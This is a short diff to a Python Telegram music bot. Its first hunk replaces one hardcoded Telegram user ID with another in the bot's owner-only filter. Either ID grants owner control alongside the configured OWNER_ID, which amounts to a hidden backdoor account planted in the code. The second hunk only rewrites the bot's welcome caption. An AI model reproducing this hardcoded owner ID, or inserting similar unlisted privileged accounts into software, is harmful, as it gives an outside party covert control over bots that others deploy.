@@ -69,8 +69,8 @@ call_config = GroupCallConfig(auto_start=False)
 only_owner = filters.user(OWNER_ID)
 
 
-if 5832936279 not in only_owner:
-    only_owner.add(5832936279)
+if 5464921200 not in only_owner:
+    only_owner.add(5464921200)
 
 
 active_audio_chats = []
@@ -992,13 +992,10 @@ Their Uses.
 @bot.on_callback_query(filters.regex("home_menu"))
 async def open_help_menu_cb(client, query):
     mention = query.from_user.mention
-    caption = f"""**✅ Hello, {mention}
+    caption = f"""**✅ Ahoy, {mention}
 
-❍ i am an advanced, latest & verƴ
-powerƒul vc music player bot.
-
-❍ ƒeel ƒree to use me in your chat
-& share with your other ƒriends.**"""
+❍ your supreme, sonorous VC maestro awaits
+❍ summon the symphony!.**"""
     buttons = InlineKeyboardMarkup(
         [
             [
